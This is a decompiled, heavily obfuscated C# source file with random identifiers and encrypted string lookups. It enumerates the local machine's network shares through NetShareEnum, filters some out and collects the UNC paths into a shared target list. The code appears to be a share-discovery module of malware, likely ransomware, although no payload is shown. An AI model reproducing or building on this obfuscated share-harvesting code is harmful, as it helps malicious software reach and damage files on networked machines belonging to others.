using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;

namespace ybfSLIGKlaODvJ;

public sealed class IGPnsGDKEcXlp
{
	[StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
	public struct rKALYXOwfAcwu
	{
		public string lEdTKQwSkP;

		public uint uOeUYRwBlPe;

		public string izdrezjvEyPh;

		public rKALYXOwfAcwu(string string_0, uint uint_0, string string_1)
		{
			lEdTKQwSkP = string_0;
			uOeUYRwBlPe = uint_0;
			izdrezjvEyPh = string_1;
		}

		public override string ToString()
		{
			return lEdTKQwSkP;
		}
	}

	[NonSerialized]
	internal static GetString getString_0;

	public rKALYXOwfAcwu[] JcmqyBEOwKyu(string string_0)
	{
		List<rKALYXOwfAcwu> list = new List<rKALYXOwfAcwu>();
		int int_ = 0;
		int int_2 = 0;
		int int_3 = 0;
		int num = Marshal.SizeOf(typeof(rKALYXOwfAcwu));
		IntPtr intptr_ = IntPtr.Zero;
		StringBuilder stringBuilder_ = new StringBuilder(string_0);
		int num2 = NetShareEnum(stringBuilder_, 1, ref intptr_, uint.MaxValue, ref int_, ref int_2, ref int_3);
		if (num2 == 0)
		{
			IntPtr ptr = intptr_;
			for (int i = 0; i < int_; i++)
			{
				rKALYXOwfAcwu item = (rKALYXOwfAcwu)Marshal.PtrToStructure(ptr, typeof(rKALYXOwfAcwu));
				list.Add(item);
				ptr += num;
			}
			NetApiBufferFree(intptr_);
			return list.ToArray();
		}
		list.Add(new rKALYXOwfAcwu(getString_0(107398351) + num2, 10u, string.Empty));
		return list.ToArray();
	}

	[DllImport("Netapi32.dll", SetLastError = true)]
	private static extern int NetApiBufferFree(IntPtr intptr_0);

	[DllImport("Netapi32.dll", CharSet = CharSet.Unicode)]
	private static extern int NetShareEnum(StringBuilder stringBuilder_0, int int_0, ref IntPtr intptr_0, uint uint_0, ref int int_1, ref int int_2, ref int int_3);

	public static void MiQnSlBekFojFQ()
	{
		try
		{
			string[] logicalDrives = Directory.GetLogicalDrives();
			rKALYXOwfAcwu[] array = new IGPnsGDKEcXlp().JcmqyBEOwKyu(Environment.MachineName);
			rKALYXOwfAcwu[] array2 = array;
			for (int i = 0; i < array2.Length; i++)
			{
				rKALYXOwfAcwu rKALYXOwfAcwu = array2[i];
				if (rKALYXOwfAcwu.ToString().Contains(getString_0(107398342)) || rKALYXOwfAcwu.ToString().Contains(getString_0(107398365)) || rKALYXOwfAcwu.ToString().Contains(getString_0(107398356)) || rKALYXOwfAcwu.ToString().Contains(getString_0(107389541)) || logicalDrives.Contains(rKALYXOwfAcwu.ToString().Replace(getString_0(107404379), getString_0(107398315))))
				{
					continue;
				}
				if (!iWNOuKBWgwsf.bxAnSckylQQtw.Contains(getString_0(107389592) + Environment.MachineName + getString_0(107397401) + rKALYXOwfAcwu))
				{
					iWNOuKBWgwsf.bxAnSckylQQtw.Add(getString_0(107389592) + Environment.MachineName + getString_0(107397401) + rKALYXOwfAcwu);
				}
				if (iWNOuKBWgwsf.rjVAnmtTRGwdsGoP)
				{
					try
					{
						Console.WriteLine(getString_0(107398310), getString_0(107389592) + Environment.MachineName + getString_0(107397401) + rKALYXOwfAcwu);
					}
					catch (Exception)
					{
					}
				}
			}
		}
		catch (Exception ex2)
		{
			if (iWNOuKBWgwsf.eCrtUqxUXqEDfkG)
			{
				try
				{
					File.AppendAllText(iWNOuKBWgwsf.ZOToawIMfprr, getString_0(107398285) + ex2.Message);
					return;
				}
				catch (Exception)
				{
					return;
				}
			}
		}
	}

	static IGPnsGDKEcXlp()
	{
		Strings.CreateGetStringDelegate(typeof(IGPnsGDKEcXlp));
	}
}
